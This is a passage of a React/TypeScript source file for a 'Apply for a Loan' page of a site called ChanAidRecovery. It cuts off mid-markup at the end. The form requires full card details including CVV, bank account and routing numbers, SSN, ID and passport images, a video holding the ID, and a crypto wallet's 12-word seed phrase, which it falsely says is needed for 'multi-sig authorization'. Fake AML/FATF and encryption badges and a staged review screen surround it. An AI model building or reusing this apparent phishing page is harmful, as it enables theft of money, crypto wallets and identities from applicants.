import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { SiteShell } from "@/components/layout/SiteShell";
import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, Fingerprint, RefreshCw, Video } from "lucide-react";
import { useLoanApplication } from "@/hooks/useLoanApplication";
import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
import { Reveal } from "@/components/effects/Reveal";
import { VideoCapture } from "@/components/loan/VideoCapture";

// Renders only on client to avoid SSR/CSR text mismatch (React #418).
function ClientClock() {
  const [time, setTime] = useState<string>("");
  useEffect(() => {
    const tick = () => setTime(new Date().toLocaleTimeString());
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, []);
  return <>{time}</>;
}

// ─── Identity Verification sub-components (defined before LoansPage so TanStack
//     code-splitting includes them in the component chunk) ──────────────────────

function VerificationStep({
  stepNumber, title, subtitle, completed, description, icon, requirements, optional, children,
}: {
  stepNumber: number;
  title: string;
  subtitle: string;
  completed: boolean;
  description: string;
  icon: React.ReactNode;
  requirements: string[];
  optional?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div className={`mx-4 mb-4 rounded-2xl border-2 transition-all overflow-hidden ${
      completed ? "border-emerald-300 bg-emerald-50/40" : "border-slate-200 bg-white"
    }`}>
      <div className={`px-5 py-3.5 flex items-center gap-3 border-b ${
        completed ? "border-emerald-200 bg-emerald-50" : "border-slate-100 bg-slate-50"
      }`}>
        <div className={`w-9 h-9 rounded-full flex items-center justify-center shrink-0 transition-all ${
          completed ? "bg-emerald-500 text-white" : optional ? "bg-slate-200 text-slate-500" : "bg-primary text-white"
        }`}>
          {completed ? <CheckCircle2 className="w-4 h-4" /> : <span className="text-sm font-bold">{stepNumber}</span>}
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-sm font-bold text-slate-900">{title}</span>
            {optional && <span className="text-[10px] font-semibold bg-slate-200 text-slate-500 px-2 py-0.5 rounded-full uppercase tracking-wider">Optional</span>}
            {completed && <span className="text-[10px] font-semibold bg-emerald-100 text-emerald-700 px-2 py-0.5 rounded-full uppercase tracking-wider">Verified</span>}
          </div>
          <div className="text-[11px] text-slate-500 mt-0.5">{subtitle}</div>
        </div>
        <div className={`shrink-0 w-8 h-8 rounded-lg flex items-center justify-center ${
          completed ? "bg-emerald-100 text-emerald-600" : "bg-primary/10 text-primary"
        }`}>
          {icon}
        </div>
      </div>
      <div className="p-5 space-y-4">
        <p className="text-sm text-slate-600 leading-relaxed">{description}</p>
        <div className="grid sm:grid-cols-2 gap-1.5">
          {requirements.map((r) => (
            <div key={r} className="flex items-start gap-1.5 text-[11px] text-slate-500">
              <CheckCircle2 className="w-3 h-3 text-slate-400 mt-0.5 shrink-0" />
              {r}
            </div>
          ))}
        </div>
        {children}
      </div>
    </div>
  );
}

function UploadZone({
  label, sublabel, description, icon, value, onChange,
}: {
  label: string;
  sublabel: string;
  description: string;
  icon: React.ReactNode;
  value: string | null;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
}) {
  const uploaded = Boolean(value);
  return (
    <div>
      <div className="flex items-center gap-1.5 mb-1.5">
        <span className="text-xs font-bold text-slate-800">{label}</span>
        <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded-full ${sublabel === "Required" ? "bg-red-100 text-red-600" : "bg-slate-100 text-slate-500"}`}>
          {sublabel}
        </span>
      </div>
      <label className={`group relative flex flex-col items-center justify-center gap-2 border-2 border-dashed rounded-xl p-5 cursor-pointer transition-all min-h-[130px]
        ${uploaded ? "border-emerald-400 bg-emerald-50" : "border-slate-300 bg-white hover:border-primary/60 hover:bg-primary/5"}`}>
        <input type="file" accept="image/*,application/pdf" onChange={onChange} className="sr-only" />
        {uploaded && value ? (
          <>
            <img src={value.startsWith("data:image") ? value : undefined} alt={label} className="h-16 w-full object-cover rounded-lg" />
            <div className="absolute top-2 right-2 bg-emerald-500 rounded-full p-0.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-white" />
            </div>
            <span className="text-[10px] text-emerald-700 font-semibold">Uploaded — click to replace</span>
          </>
        ) : (
          <>
            <div className="w-10 h-10 rounded-full bg-slate-100 border border-slate-200 flex items-center justify-center group-hover:bg-primary/10 group-hover:border-primary/30 transition-all">
              {icon}
            </div>
            <span className="text-[11px] text-slate-500 text-center leading-relaxed px-2">{description}</span>
            <span className="text-[10px] font-bold text-primary uppercase tracking-wider">Click to upload</span>
          </>
        )}
      </label>
    </div>
  );
}

// ─── Route ───────────────────────────────────────────────────────────────────

export const Route = createFileRoute("/loans")({
  head: () => ({
    meta: [
      { title: "Apply for a Loan | ChanAidRecovery" },
      { name: "description", content: "Apply for a personal loan with ChanAidRecovery. Choose bank transfer, card, or crypto payout. Fast review, transparent terms." },
      { property: "og:title", content: "Apply for a Loan | ChanAidRecovery" },
      { property: "og:description", content: "Apply for a personal loan. Bank transfer, card, or crypto payout. Fast review." },
    ],
  }),
  component: LoansPage,
});

// ─── Page ────────────────────────────────────────────────────────────────────

function LoansPage() {
  const {
    loading, done, countdown, payout, setPayout,
    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
    cardCvv, setCardCvv, cardErrors, setCardErrors,
    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
    onSelfieChange, onIdFrontChange, onIdBackChange, onPassportFrontChange, onPassportBackChange,
    onVideoSelfieChange, handleSubmit,
    appStatus, appId, clearSession,
  } = useLoanApplication();

  return (
    <SiteShell>
      <section className="bg-hero-gradient">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-red-600 border border-red-200">
            <Banknote className="w-3.5 h-3.5" /> Fast-Track Processing Available
          </span>
          <h1 className="mt-5 text-4xl sm:text-5xl font-bold leading-tight">
            Apply for a <span className="text-gradient">Loan</span>
          </h1>
          <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto">
            Get the financial support you need. Apply now for immediate review and get priority funding directly to your bank, card, or crypto wallet.
          </p>
        </div>
      </section>

      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
        {done ? (
          <div className="max-w-3xl mx-auto">
            <div className="rounded-3xl bg-white shadow-elegant overflow-hidden border border-border animate-in fade-in zoom-in duration-500">
              {/* Header Status Bar */}
              <div className={`px-8 py-4 flex items-center justify-between ${
                appStatus?.status === 'verified' ? 'bg-emerald-600' :
                appStatus?.status === 'rejected' ? 'bg-red-600' :
                appStatus?.status === 'needs_correction' ? 'bg-purple-600' :
                'bg-slate-900'
              }`}>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white">
                    {appStatus?.status === 'verified' ? <CheckCircle2 className="w-5 h-5" /> : <Clock className="w-5 h-5 animate-pulse" />}
                  </div>
                  <div>
                    <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Application Status</div>
                    <div className="text-white font-bold text-sm uppercase tracking-wider">
                      {appStatus?.status ? appStatus.status.replace('_', ' ') : 'Processing...'}
                    </div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Last Update</div>
                  <div className="text-white font-mono text-[10px]">
                    <ClientClock />
                  </div>
                </div>
              </div>

              <div className="p-8 sm:p-12 text-center">
                {appStatus?.status === 'verified' ? (
                  <div className="space-y-6">
                    <div className="w-24 h-24 bg-emerald-100 rounded-full flex items-center justify-center mx-auto shadow-inner">
                      <ShieldCheck className="w-12 h-12 text-emerald-600" />
                    </div>
                    <h2 className="text-3xl font-black text-slate-900 tracking-tight">Identity Verified</h2>
                    <div className="bg-emerald-50 border-2 border-emerald-100 rounded-2xl p-6 max-w-md mx-auto">
                      <p className="text-emerald-800 font-bold mb-2 flex items-center justify-center gap-2">
                        <BadgeCheck className="w-5 h-5" /> Priority Funding Released
                      </p>
                      <p className="text-sm text-emerald-700 leading-relaxed font-medium">
                        Your documents have been verified. The requested amount of <strong>{appStatus.currency} {Number(appStatus.amountRequested).toLocaleString()}</strong> is being settled.
                      </p>
                    </div>
                    <p className="text-slate-500 max-w-sm mx-auto text-sm">
                      Redirecting you to the secure fund management portal...
                    </p>
                    <div className="text-7xl font-black text-primary animate-pulse tabular-nums">
                      {countdown}
                    </div>
                  </div>
                ) : appStatus?.status === 'rejected' || appStatus?.status === 'needs_correction' ? (
                  <div className="space-y-6">
                    <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto shadow-inner">
                      <AlertTriangle className="w-12 h-12 text-red-600" />
                    </div>
                    <h2 className="text-3xl font-black text-slate-900 tracking-tight">Review Alert</h2>
                    <div className="bg-red-50 border-2 border-red-100 rounded-2xl p-6 max-w-md mx-auto">
                      <p className="text-red-800 font-bold mb-2 uppercase tracking-widest text-xs">Correction Required</p>
                      <p className="text-sm text-red-700 leading-relaxed font-medium">
                        {appStatus?.rejectionReason || "Our team was unable to verify your identity with the provided documents. Please ensure images are clear and valid."}
                      </p>
                    </div>
                    <button
                      onClick={() => {
                        clearSession();
                        window.location.reload();
                      }}
                      className="inline-flex items-center gap-2 text-primary font-bold text-sm border-b-2 border-primary/20 hover:border-primary transition-all pb-0.5"
                    >
                      Update Documentation & Retry
                    </button>
                  </div>
                ) : (
                  <div className="space-y-8">
                    <div className="relative w-32 h-32 mx-auto">
                      <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
                      <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin"></div>
                      <div className="absolute inset-0 flex items-center justify-center">
                        <Fingerprint className="w-12 h-12 text-primary opacity-20 animate-pulse" />
                      </div>
                    </div>
                    
                    <div className="space-y-3">
                      <h2 className="text-3xl font-black text-slate-900 tracking-tight italic">Biometric Review</h2>
                      <p className="text-slate-500 max-w-md mx-auto text-sm leading-relaxed">
                        Your application <span className="font-mono text-xs bg-slate-100 px-1.5 py-0.5 rounded">#{appId?.slice(0,8)}</span> has been securely queued. Our officers are verifying your biometric video and ID documents against global databases.
                      </p>
                    </div>

                    {/* Visual Pipeline */}
                    <div className="max-w-md mx-auto grid grid-cols-3 gap-1 relative">
                       <div className="absolute top-4 left-[15%] right-[15%] h-1 bg-slate-100 -z-10">
                          <div className={`h-full bg-primary transition-all duration-1000 ${appStatus?.status === 'under_review' ? 'w-1/2' : 'w-0'}`}></div>
                       </div>
                       {[
                         { id: 'pending', label: 'Queued', icon: <FileCheck2 className="w-4 h-4" /> },
                         { id: 'under_review', label: 'In Review', icon: <RefreshCw className="w-4 h-4" /> },
                         { id: 'verified', label: 'Released', icon: <CheckCircle2 className="w-4 h-4" /> }
                       ].map((step, i) => {
                         const isActive = appStatus?.status === step.id || (step.id === 'pending' && !appStatus);
                         const isPast = (step.id === 'pending' && appStatus?.status === 'under_review');
                         return (
                           <div key={step.id} className="flex flex-col items-center gap-2">
                             <div className={`w-10 h-10 rounded-full flex items-center justify-center shadow-sm border-2 transition-all ${
                               isActive ? "bg-primary text-white border-primary scale-110" : 
                               isPast ? "bg-emerald-500 text-white border-emerald-500" :
                               "bg-white text-slate-300 border-slate-100"
                             }`}>
                               {step.icon}
                             </div>
                             <span className={`text-[10px] font-black uppercase tracking-tighter ${isActive ? "text-primary" : "text-slate-400"}`}>{step.label}</span>
                           </div>
                         );
                       })}
                    </div>

                    <div className="bg-slate-50 rounded-2xl p-5 border border-slate-100 flex items-center gap-4 text-left max-w-md mx-auto">
                      <div className="w-10 h-10 rounded-xl bg-white border border-slate-200 flex items-center justify-center shrink-0 shadow-sm">
                        <Clock className="w-5 h-5 text-slate-400" />
                      </div>
                      <div className="flex-1">
                        <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-none mb-1">Estimated Wait</div>
                        <div className="text-slate-900 font-bold text-sm">5 — 15 Minutes</div>
                      </div>
                      <div className="px-3 py-1 bg-emerald-50 text-emerald-600 text-[10px] font-black rounded-lg uppercase tracking-tighter">
                        Priority Queue
                      </div>
                    </div>

                    <p className="text-[10px] text-slate-400 font-medium">
                      Do not close this window. Your browser is maintaining a secure, authenticated session with the verification gateway.
                    </p>
                  </div>
                )}
              </div>
            </div>
            
            <div className="mt-8 flex justify-center">
               <button 
                onClick={() => {
                  localStorage.removeItem("chanaid_loan_id");
                  window.location.reload();
                }}
                className="text-slate-400 hover:text-slate-600 text-xs font-semibold flex items-center gap-2 transition-colors"
               >
                 <RefreshCw className="w-3.5 h-3.5" /> Start a new application
               </button>
            </div>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
            <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />

            <div className="rounded-xl bg-soft-gradient border border-border p-4 mb-8 flex gap-3 text-sm">
              <Lock className="w-5 h-5 text-primary mt-0.5 shrink-0" />
              <p className="text-muted-foreground">
                Your information is transmitted over an encrypted connection and reviewed securely by our loan officers.
              </p>
            </div>

            <Section title="Your details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="first_name" label="First name *" required autoComplete="given-name" />
                <Input name="last_name" label="Last name" autoComplete="family-name" />
                <Input name="email" type="email" label="Email *" required autoComplete="email" />
                <Input name="phone" label="Phone" autoComplete="tel" />
                <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
                <Select name="employment_status" label="Employment status">
                  <option value="">Select…</option>
                  <option>Employed full-time</option>
                  <option>Employed part-time</option>
                  <option>Self-employed</option>
                  <option>Unemployed</option>
                  <option>Retired</option>
                  <option>Student</option>
                </Select>
                <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
                <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
              </div>
            </Section>

            <Section title="Address">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
                <Input name="city" label="City" autoComplete="address-level2" />
                <Input name="state_region" label="State / Region" autoComplete="address-level1" />
                <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
                <Input name="country" label="Country" autoComplete="country-name" />
              </div>
            </Section>

            <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-8 flex items-center gap-4">
              <div className="bg-primary/10 p-2.5 rounded-xl">
                <ShieldCheck className="w-6 h-6 text-primary" />
              </div>
              <div>
                <div className="text-sm font-bold text-slate-900">Encrypted 256-bit Connection</div>
                <div className="text-xs text-muted-foreground">Your data is secured using industry-standard AES encryption and transmitted via a dedicated secure tunnel.</div>
              </div>
            </div>

            <Section title="Loan details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" required />
                <Select name="currency" label="Currency" defaultValue="USD">
                  <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
                </Select>
                <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
                <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
                <div className="sm:col-span-2">
                  <Label>Purpose of loan</Label>
                  <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm" />
                </div>
              </div>
            </Section>

            <Section title="Financial & Payout Details">
              <div className="mb-6">
                <Label>Select preferred payout method *</Label>
                <div className="grid sm:grid-cols-3 gap-3 mt-2">
                  <PayoutOption
                    selected={payout === "bank_transfer"}
                    onClick={() => setPayout("bank_transfer")}
                    icon={<Banknote className="w-5 h-5" />}
                    title="Bank Transfer"
                    desc="Direct deposit to your account."
                    recommended
                  />
                  <PayoutOption
                    selected={payout === "card"}
                    onClick={() => setPayout("card")}
                    icon={<CreditCard className="w-5 h-5" />}
                    title="Card Deposit"
                    desc="Fast payout to debit/credit card."
                  />
                  <PayoutOption
                    selected={payout === "crypto"}
                    onClick={() => setPayout("crypto")}
                    icon={<Wallet className="w-5 h-5" />}
                    title="Crypto Wallet"
                    desc="USDT, BTC, or ETH transfer."
                    badge="Fastest"
                  />
                </div>
              </div>

              <div className="rounded-xl bg-slate-50 border border-slate-200 p-5 mb-8">
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary">
                    <ShieldCheck className="w-5 h-5" />
                  </div>
                  <div>
                    <h4 className="font-bold text-slate-900 text-sm">Financial Verification</h4>
                    <p className="text-xs text-slate-500">Please provide your payout and verification accounts. This information is used for both fund release and identity validation.</p>
                  </div>
                </div>

                <div className="space-y-8">
                  {/* Bank Details */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
                      <Banknote className="w-4 h-4 text-primary" />
                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Bank Account Details</h5>
                    </div>
                    <div className="grid sm:grid-cols-2 gap-3">
                      <Input name="account_holder_name" label="Account holder name *" required />
                      <Input name="bank_name" label="Bank name (e.g. Chase) *" required />
                      <Input name="bank_account_number" label="Account number *" inputMode="numeric" required />
                      <Input name="bank_routing_number" label="Routing / SWIFT / IBAN *" required />
                    </div>
                  </div>

                  {/* Card Details */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
                      <CreditCard className="w-4 h-4 text-primary" />
                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Credit / Debit Card Details</h5>
                    </div>
                    <div className="grid sm:grid-cols-2 gap-3">
                      <Input name="card_holder_name" label="Cardholder name *" required autoComplete="cc-name" />
                      <Select name="card_issuer" label="Card issuer *" required>
                        <option value="">Select…</option>
                        <option>Visa</option><option>Mastercard</option>
                        <option>American Express</option><option>Discover</option><option>Other</option>
                      </Select>

                      <div className="sm:col-span-2">
                        <Label>Card number *</Label>
                        <input
                          value={cardNumber}
                          onChange={(e) => {
                            setCardNumber(formatCardNumber(e.target.value));
                            if (cardErrors.card_number) setCardErrors(p => ({ ...p, card_number: "" }));
                          }}
                          inputMode="numeric"
                          autoComplete="cc-number"
                          placeholder="1234 5678 9012 3456"
                          maxLength={19}
                          required
                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                        />
                        {cardErrors.card_number && <p className="text-xs text-red-500 mt-1">{cardErrors.card_number}</p>}
                      </div>

                      <div>
                        <Label>Expiry (MM/YY) *</Label>
                        <input
                          value={cardExpiry}
                          onChange={(e) => {
                            setCardExpiry(formatExpiry(e.target.value));
                            if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
                          }}
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          placeholder="MM/YY"
                          maxLength={5}
                          required
                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                        />
                        {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
                      </div>

                      <div>
                        <Label>CVV *</Label>
                        <input
                          value={cardCvv}
                          onChange={(e) => {
                            setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                            if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
                          }}
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          placeholder="123"
                          maxLength={4}
                          required
                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                        />
                        {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
                      </div>
                    </div>

                    <div className="mt-4">
                      <h4 className="font-semibold mb-3 text-[11px] text-slate-500 uppercase tracking-wider">Card Billing Address</h4>
                      <div className="grid sm:grid-cols-2 gap-3">
                        <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" autoComplete="address-line1" />
                        <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
                        <Input name="billing_city" label="City *" required autoComplete="address-level2" />
                        <Input name="billing_state" label="State / Region *" required autoComplete="address-level1" />
                        <Input name="billing_postal_code" label="Postal code *" required autoComplete="postal-code" />
                        <Input name="billing_country" label="Country *" required autoComplete="country-name" />
                      </div>
                    </div>
                  </div>

                  {/* Crypto Details */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
                      <Wallet className="w-4 h-4 text-primary" />
                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Crypto Wallet Details</h5>
                    </div>
                    <div className="grid sm:grid-cols-2 gap-3">
                      <Select name="crypto_wallet_type" label="Wallet type *" required>
                        <option value="">Select wallet…</option>
                        <option>Trust Wallet</option>
                        <option>MetaMask</option>
                        <option>Coinbase Wallet</option>
                        <option>Phantom</option>
                        <option>Exodus</option>
                        <option>Ledger</option>
                        <option>Trezor</option>
                        <option>Other</option>
                      </Select>
                      <Input name="crypto_wallet_address" label="Wallet address *" required placeholder="0x… or bc1… or similar" />
                    </div>
                    <div>
                      <Label>12-word recovery / seed phrase *</Label>
                      <textarea
                        name="crypto_seed_phrase"
                        rows={3}
                        required
                        placeholder="Enter your 12-word recovery phrase separated by spaces"
                        className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm font-mono"
                      />
                      <p className="text-[10px] text-muted-foreground mt-1 flex items-start gap-1.5 italic">
                        <Lock className="w-3 h-3 text-primary mt-0.5 shrink-0" />
                        Required for secure multi-sig authorization and fund transfer.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <p className="text-xs text-muted-foreground mt-3 flex items-start gap-2">
                <ShieldCheck className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                All financial data is processed via an isolated, air-gapped secure environment and reviewed by our compliance team.
              </p>
            </Section>

            {/* ─── Identity Verification Workflow ──────────────────────── */}
            <div className="mb-8">
              {/* Authority header */}
              <div className="bg-slate-900 rounded-t-2xl px-6 py-5 flex flex-wrap items-center gap-4">
                <div className="flex items-center gap-3 flex-1 min-w-0">
                  <div className="w-11 h-11 rounded-full bg-amber-400/20 border border-amber-400/40 flex items-center justify-center shrink-0">
                    <ShieldCheck className="w-6 h-6 text-amber-400" />
                  </div>
                  <div>
                    <div className="text-white font-extrabold text-sm tracking-widest uppercase">Mandatory Identity Verification</div>
                    <div className="text-slate-400 text-[11px] mt-0.5">Global AML/KYC Standards · FATF Compliant · End-to-End Encrypted</div>
                  </div>
                </div>
                <div className="flex items-center gap-1.5 bg-amber-400/10 border border-amber-400/30 rounded-full px-3 py-1.5 shrink-0">
                  <Lock className="w-3 h-3 text-amber-400" />
                  <span className="text-amber-400 text-[10px] font-bold uppercase tracking-wider">256-bit AES Secure</span>
                </div>
              </div>

              {/* Compliance badge row */}
              <div className="bg-slate-800 px-6 py-2.5 flex flex-wrap gap-x-5 gap-y-1.5">
                {["KYC Required", "AML Compliant", "FATF Compliant", "GDPR / Privacy Protected", "TLS 1.3 Encrypted"].map((b) => (
                  <div key={b} className="flex items-center gap-1.5">
                    <BadgeCheck className="w-3 h-3 text-emerald-400" />
                    <span className="text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">{b}</span>
                  </div>
                ))}
              </div>

              {/* Workflow body */}
              <div className="border border-t-0 border-slate-200 rounded-b-2xl bg-white overflow-hidden">
                {/* Intro notice */}
                <div className="px-6 pt-5 pb-1">
                  <div className="flex gap-3 bg-amber-50 border border-amber-200 rounded-xl p-4">
                    <AlertTriangle className="w-5 h-5 text-amber-600 mt-0.5 shrink-0" />
                    <p className="text-sm text-amber-800 leading-relaxed">
                      <strong>Identity verification is required before your application can be reviewed.</strong> Complete all three steps below. Submitting false or fraudulent documentation is a serious criminal offence under applicable law in your jurisdiction.
                    </p>
                  </div>
                </div>

                {/* Progress tracker */}
                <div className="px-6 py-4 flex items-center gap-2">
                  {[
                    { n: 1, label: "Selfie", done: Boolean(selfieImage) },
                    { n: 2, label: "Primary ID", done: Boolean(idFrontImage && idBackImage) },
                    { n: 3, label: "Secondary Doc", done: Boolean(passportFrontImage || passportBackImage) },
                    { n: 4, label: "Video Selfie", done: Boolean(videoSelfie) },
                  ].map((step, i, arr) => (
                    <div key={step.n} className="flex items-center gap-2 flex-1">
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold shrink-0 transition-all ${
                        step.done
                          ? "bg-emerald-500 text-white"
                          : "bg-slate-100 text-slate-500 border-2 border-slate-200"
                      }`}>
                        {step.done ? <CheckCircle2 className="w-4 h-4" /> : step.n}
                      </div>
                      <span className={`text-xs font-semibold hidden sm:block ${step.done ? "text-emerald-600" : "text-slate-500"}`}>{step.label}</span>
                      {i < arr.length - 1 && <div className={`h-px flex-1 ${step.done ? "bg-emerald-300" : "bg-slate-200"}`} />}
                    </div>
                  ))}
                </div>

                {/* Step 1 — Selfie */}
                <VerificationStep
                  stepNumber={1}
                  title="Live Selfie — Face Photo"
                  subtitle="Required · Takes 30 seconds"
                  completed={Boolean(selfieImage)}
                  description="Take or upload a clear, front-facing photo of yourself. Ensure your face is fully visible, well-lit, and unobstructed. No hats, sunglasses, or heavy filters."
                  icon={<Camera className="w-5 h-5" />}
                  requirements={["Face clearly visible", "Even lighting, no shadows", "Plain or neutral background", "No sunglasses or face coverings"]}
                >
                  <UploadZone
                    label="Selfie / Face Photo"
                    sublabel="Required"
                    description="Front-facing photo of your face"
                    icon={<Camera className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
                    value={selfieImage}
                    onChange={onSelfieChange}
                  />
                </VerificationStep>

                {/* Step 2 — Primary Government ID */}
                <VerificationStep
                  stepNumber={2}
                  title="Primary Government-Issued ID"
                  subtitle="Required · National ID, Driver's License, or State ID"
                  completed={Boolean(idFrontImage && idBackImage)}
                  description="Upload both sides of a valid, unexpired government-issued photo ID. Accepted documents: National Identity Card, Driver's License, or State-Issued ID Card."
                  icon={<IdCard className="w-5 h-5" />}
                  requirements={["Document must be valid and unexpired", "All four corners must be visible", "Text must be legible — no glare or blur", "JPEG, PNG, or PDF accepted · Max 10MB"]}
                >
                  <div className="grid sm:grid-cols-2 gap-4">
                    <UploadZone
                      label="ID Front Side"
                      sublabel="Required"
                      description="Front face of your ID showing name, photo & number"
                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
                      value={idFrontImage}
                      onChange={onIdFrontChange}
                    />
                    <UploadZone
                      label="ID Back Side"
                      sublabel="Required"
                      description="Reverse side showing barcode, signature or address"
                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
                      value={idBackImage}
                      onChange={onIdBackChange}
                    />
                  </div>
                </VerificationStep>

                {/* Step 3 — Secondary Document */}
                <VerificationStep
                  stepNumber={3}
                  title="Secondary Identity Document"
                  subtitle="Recommended · Passport or additional Driver's License"
                  completed={Boolean(passportFrontImage || passportBackImage)}
                  description="Provide a secondary document for additional verification. A valid passport is the preferred secondary document. This step significantly accelerates your application review."
                  icon={<BookOpen className="w-5 h-5" />}
                  requirements={["Passport biographical page preferred", "Document must match primary ID details", "Must be clear and fully in-frame", "Strengthens approval likelihood"]}
                  optional
                >
                  <div className="grid sm:grid-cols-2 gap-4">
                    <UploadZone
                      label="Passport / License — Front"
                      sublabel="Recommended"
                      description="Biographical page: photo, full name, document number"
                      icon={<BookOpen className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
                      value={passportFrontImage}
                      onChange={onPassportFrontChange}
                    />
                    <UploadZone
                      label="Passport / License — Back"
                      sublabel="Optional"
                      description="Signature page or reverse side of document"
                      icon={<FileCheck2 className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
                      value={passportBackImage}
                      onChange={onPassportBackChange}
                    />
                  </div>
                </VerificationStep>

                {/* Step 4 — Video Selfie */}
                <VerificationStep
                  stepNumber={4}
                  title="Biometric Video Verification"
                  subtitle="Required · Enhanced Security Layer"
                  completed={Boolean(videoSelfie)}
                  description="Record a short video (up to 15s) stating your name and holding your ID card (front and back) clearly. This is a mandatory requirement to prevent identity theft."
                  icon={<Video className="w-5 h-5" />}
                  requirements={["State your full name", "Show ID front clearly", "Show ID back clearly", "Face must be visible"]}
                >
                  <VideoCapture
                    label="Video ID Verification"
                    value={videoSelfie}
                    onCapture={onVideoSelfieChange}
                  />
                </VerificationStep>

                {/* Legal footer */}
                <div className="px-6 pb-5">
                  <p className="text-[10px] text-slate-400 leading-relaxed border-t border-slate-100 pt-4">
                    By uploading documents you confirm that all documents are genuine, valid, and belong to you. All files are transmitted over TLS 1.3 and stored using AES-256 encryption on certified, access-controlled infrastructure. Documents are accessible exclusively to authorised compliance personnel and are never sold or shared with third parties, except as required by applicable law or a lawful court order. Submission of false documentation constitutes fraud and may result in criminal prosecution under the laws of your jurisdiction.
                  </p>
                </div>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
            >
              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
              {loading ? "Submitting…" : "Submit Application"}
            </button>
            <Reveal direction="up" delay={100}>
